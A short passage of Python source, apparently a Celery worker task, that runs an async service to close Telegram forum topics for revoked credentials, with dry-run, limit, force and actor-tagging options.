    limit: int | None = None,
    dry_run: bool = False,
    credential_id: str | None = None,
    reason: str | None = None,
    force: bool = False,
):
    """Close Telegram forum topics for revoked credentials."""
    from app.services.topic_admin_srv import close_revoked_topics_logic
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        close_revoked_topics_logic(
            limit=limit or settings.REVOKED_TOPIC_CLOSE_BATCH_SIZE,
            dry_run=dry_run,
            credential_id=credential_id,
            actor=f"celery_worker:{reason}" if reason else "celery_worker",
            force=force,
        )
    )
